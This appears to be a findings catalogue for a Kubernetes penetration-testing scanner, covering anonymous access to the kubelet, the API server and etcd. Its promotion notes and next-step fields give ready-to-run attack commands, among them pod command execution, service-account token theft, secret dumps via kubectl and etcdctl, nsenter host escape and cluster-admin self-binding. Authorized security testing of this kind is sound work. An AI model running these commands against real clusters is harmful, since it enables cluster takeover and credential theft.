summary: Deep and role-aware: probes kubelet (10250 anon /pods, /run exec route, /logs dir), kubelet-ro (10255), kube-apiserver (anon list of ns/secrets/configmaps/serviceaccounts/nodes/clusterrolebindings, SelfSubjectRulesReview for authoritative RBAC map, escape-pod counter), and etcd (v2 keys + v3 maintenance/status). Explicitly does NOT exec, does NOT dump secrets — leaves those as tester_next_step. Biggest gap: no attempt to actually POST to /run for a canary command (still gated behind ROE) and no service-account-token capture flow that would take it to T3.

findings.title_pattern: Kubelet /run exec route reachable without auth
findings.tier_evidence: GET /run/{ns}/{pod}/{container} answering non-404 is deterministic proof the exec route exists and would accept POST; no command actually executed.
findings.promotion_notes: POST /run/{ns}/{pod}/{container} -d 'cmd=id' — captures stdout of `id` as proof of RCE inside the target pod. Considered intrusive (arbitrary command inside someone's workload) but non-destructive if scoped to `id`/`hostname`.
findings.tester_next_step: curl -sk -X POST https://<ip>:10250/run/<ns>/<pod>/<container> -d 'cmd=id' — RCE inside pod, then cat /var/run/secrets/kubernetes.io/serviceaccount/token to pivot to apiserver.

findings.tier_evidence: GET /logs/ returning a directory listing is the CVE exposure itself; no file actually pulled.
findings.promotion_notes: Pull a benign named file (kubelet.log) as a controlled read-back, then flag CVE-2024-9042 on Windows kubelets by parameter injection PoC.
findings.tester_next_step: curl -sk https://<ip>:10250/logs/kube-apiserver.log — read audit logs, extract impersonated identities and bearer tokens; for Windows kubelets, try CVE-2024-9042 payload (parameter injection into file path).

findings.title_pattern: Kubelet allows anonymous access (exec RCE into pods)
findings.tier_evidence: GET /pods returning 200 with PodList is deterministic proof of anon kubelet; exec RCE follows but isn't launched.
findings.promotion_notes: POST /exec/<ns>/<pod>/<container>?command=cat&command=/var/run/secrets/kubernetes.io/serviceaccount/token — pull SA token, then use it against apiserver to reach cluster-admin (chain to k8s_escape_pods).
findings.tester_next_step: kubeletctl -i --server <ip> pods; kubeletctl exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' -p <pod> -n <ns> — token = kubectl access. Try kubectl --token=<X> get secrets -A.

findings.title_pattern: Kubelet read-only port exposes pod specs (secret leak)
findings.tier_evidence: Anon GET on 10255 /pods returning PodList = proof; not actively harvesting env values yet.
findings.promotion_notes: Parse the pod list and extract every containers[].env[].value that looks credential-shaped (regex like docker.py already has). Wire into known_creds pool.

findings.title_pattern: Kubernetes API allows anonymous resource listing (incl. Secrets)
findings.tier_evidence: Unauth LIST returning 200 list is deterministic proof; when anon_secrets true this is game-over anon read of the whole secret store — but recce doesn't actually pull the secret values.
findings.promotion_notes: GET /api/v1/secrets and base64-decode each secret.data.*.value; recover service-account tokens (type=kubernetes.io/service-account-token) — every one is a foothold identity. Non-destructive read.
findings.tester_next_step: kubectl --server https://<ip>:<port> --insecure-skip-tls-verify get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .data.token' | base64 -d — use each token as a bearer for further kubectl calls.

findings.title_pattern: Kubernetes API leaks additional resources unauth
findings.tier_evidence: GET /configmaps /serviceaccounts /nodes /clusterrolebindings returning 200 lists is deterministic proof of the extra unauth surface.
findings.promotion_notes: Scan configmaps for embedded secrets (regex on data values), map clusterrolebindings to find any binding of system:anonymous to cluster-admin (immediate T4).
findings.tester_next_step: kubectl ... get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name=="system:anonymous")' — any hit = the anonymous user IS cluster-admin. kubectl get configmaps -A -o yaml | grep -Ei 'password|token|api_key'

findings.tier_evidence: Counts of privileged/hostPath/hostPID/hostNetwork pods pulled from anon LIST — enumeration only, no exec into one.
findings.promotion_notes: Chain: use kubelet /exec on a privileged pod to nsenter host root. Requires the kubelet_exec / kubelet_anon finding on the same cluster.
findings.tester_next_step: kubectl --server https://<ip>:<port> get pods -A -o json | jq -r '.items[] | select(.spec.hostPID==true or (.spec.containers[]?.securityContext.privileged==true)) | "\(.metadata.namespace)/\(.metadata.name)"'; then via kubelet exec: nsenter -t 1 -m -u -i -n -p sh.

findings.tier_evidence: Just that a 403 came back — anonymous auth is enabled but RBAC blocks; no exploit primitive.
findings.promotion_notes: SSRR already covers the promotion (surface what verbs anonymous *does* hold); this finding stays informational when SSRR returns empty.
findings.tester_next_step: kubectl --server https://<ip>:<port> --insecure-skip-tls-verify auth can-i --list --as=system:anonymous — enumerate verbs anon holds.

findings.title_pattern: Kubernetes API leaks anon RBAC via SelfSubjectRulesReview
findings.tier_evidence: SSRR POST returning rules bound to system:anonymous is authoritative proof of RBAC misconfiguration; verbs listed but not exercised.
findings.promotion_notes: If verbs include create pods -> spawn a privileged pod that mounts /host, reads host root. If impersonate -> POST /api/v1/namespaces with impersonation header for another identity. If create clusterrolebinding -> self-bind to cluster-admin.
findings.tester_next_step: If mutating verbs present: kubectl --server ... --as=system:anonymous create -f privileged-pod.yaml; else focus on the read verbs already covered by api_anon_list.

findings.tier_evidence: v2 /v2/keys/?recursive=true 200 with node OR v3 /v3/maintenance/status 200 with expected fields is deterministic proof of anon read; secret bodies not dumped here.
findings.promotion_notes: ETCDCTL_API=3 etcdctl get /registry/secrets/ --prefix — recover every kubernetes secret in plaintext. Full cluster compromise.
findings.tester_next_step: ETCDCTL_API=3 etcdctl --endpoints http://<ip>:2379 get /registry/secrets/ --prefix -w json | jq -r '.kvs[] | .value | @base64d' — decrypt SA tokens and cluster TLS.
